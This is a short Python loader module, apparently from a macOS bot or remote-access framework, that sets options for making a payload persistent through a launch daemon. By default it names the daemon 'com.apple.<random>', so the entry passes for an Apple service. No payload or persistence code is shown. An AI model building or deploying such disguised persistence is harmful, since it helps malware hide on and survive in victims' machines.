# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.loaders.helper import *


class Loader(LoaderABC):
    def get_info(self) -> dict:
        return {
            "Author": ["Marten4n6"],
            "Description": "Makes payloads persistent via a launch daemon.",
            "References": []
        }

    def get_option_messages(self) -> List[str]:
        return [
            "Launch agent name (Leave empty for com.apple.<RANDOM>): ",
            "Payload filename (Leave empty for <RANDOM>): "
        ]

    def get_options(self, set_options: list) -> dict:
        launch_agent_name = set_options[0]
        payload_filename = set_options[1]

        if not launch_agent_name:
            launch_agent_name = "com.apple.{}".format(random_string())

        if not payload_filename:
            payload_filename = random_string()

        return {
            "loader_name": "launch_daemon",
            "launch_agent_name": launch_agent_name,
            "payload_filename": payload_filename
        }
